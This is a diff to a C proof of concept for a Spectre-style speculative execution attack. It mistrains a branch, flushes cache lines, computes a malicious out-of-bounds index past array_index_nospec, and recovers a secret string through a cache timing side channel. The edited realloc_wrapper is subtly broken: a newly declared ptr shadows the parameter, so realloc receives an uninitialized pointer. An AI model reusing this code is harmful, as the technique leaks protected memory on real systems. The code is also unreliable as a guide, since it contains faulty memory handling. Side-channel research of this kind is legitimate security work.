@@ -19,7 +19,7 @@
 #define TRAINING_EPOCH 16
 
 
-uint32_t array_size = 8;
+uint32_t array_size;
 
 
 void set_heap_limit(size_t limit_bytes) {
@@ -39,11 +39,12 @@ uint8_t* secret_init(){
         perror("Initial malloc failed");
         return NULL;
     }
-    array[0] = '!';
+    array[0] = 'A';
     return array;
 }
 
 uint8_t* array_init(){   
+    array_size = 8;
     uint8_t* array = malloc(array_size * sizeof(uint8_t));
     if (array == NULL) {
         perror("Initial malloc failed");
@@ -51,22 +52,34 @@ uint8_t* array_init(){
     }
     return array;
 } 
-
+size_t* old_size_global;
+size_t* new_size_global;
 static void *realloc_wrapper(void* ptr, size_t old_size, size_t new_size){
-    _mm_clflush(&old_size);
-    _mm_clflush(&new_size);
-    if (new_size <= old_size && new_size >= old_size / 2){
+    old_size_global = malloc(sizeof(size_t));
+    new_size_global = malloc(sizeof(size_t));
+    *old_size_global = old_size;
+    *new_size_global = new_size;
+    _mm_clflush(old_size_global);
+    _mm_clflush(new_size_global);
+    // printf("Realloc called: old_size=%p, new_size=%p\n", old_size_global, new_size_global);
+    if ( *new_size_global >= *old_size_global / 2 && *new_size_global <= *old_size_global){
+        free(old_size_global);
+        free(new_size_global);
         return ptr;
     } else {
-        return realloc(ptr, new_size);
+        void* ptr = realloc(ptr, *new_size_global);
+        free(old_size_global);
+        free(new_size_global);
+        return ptr;
     }
 }
 
 uint8_t* victim_function(uint8_t** array, uint8_t * page, uint32_t index, uint32_t stride, uint32_t size) {
-    uint32_t temp_array_size = size;
+    array_size = size;
+    // printf("Victim function called with index=%p, size=%p\n", &index, &size);
     *array = realloc_wrapper(*array, array_size, size);
-
-    uint8_t new_idx = array_index_nospec(index, temp_array_size);
+    
+    uint8_t new_idx = array_index_nospec(index, size);
     uint8_t secret = (*array)[new_idx];
     uint8_t transmission = page[secret * stride];
 
@@ -170,19 +183,21 @@ void attacker_function() {
     char buf[BUF_SIZE] = { '\0' };
 
     // uint8_t *array_base = &records->orders[0].item_id; // Base address 
-    uint8_t* array_base = &array[0]; // Base address
-    size_t malicious_index = (uintptr_t)secret - (uintptr_t)array_base;
-    printf("Secret address: %p, Array address: %p\n", secret, array_base);
-    printf("The malicious index is %p-%p=%#lx\n", secret, array_base,
-           malicious_index);
-    printf("-----------------------------------------\n");
 
     for (size_t c = 0; c < strlen(secret) && c < BUF_SIZE; c++) {
 
         for (size_t r = 0; r < REP; r++) {
+            free(array);
+            array = array_init();
             size_t safe_size = array_size-1; //New size but not too small to actually want to resize
             size_t safe_index = array_size/2; //An in-bound index
+            size_t malicious_index = (uintptr_t)secret - (uintptr_t)&array[0];
             size_t malicious_size = (size_t)(malicious_index+1);
+            // printf("Secret address: %p, Array address: %p\n", secret, &array[0]);
+            // printf("The malicious index is %p-%p=%#lx\n", secret, &array[0],
+            //        malicious_index);
+            // printf("-----------------------------------------\n");
+
             for (size_t t = 0; t < TRAINING_EPOCH; t++) {
                 // We use an in-bound index for the first TRAINING_EPOCH - 1
                 // iterations and switch to the malicious index
@@ -229,6 +244,7 @@ void attacker_function() {
     printf("Recovered secret: \"%s\"\n", buf);
     munmap(pages, PAGE_SIZE * SYMBOL_CNT);
     free(array);
+    free(secret);
     return;
 }
 
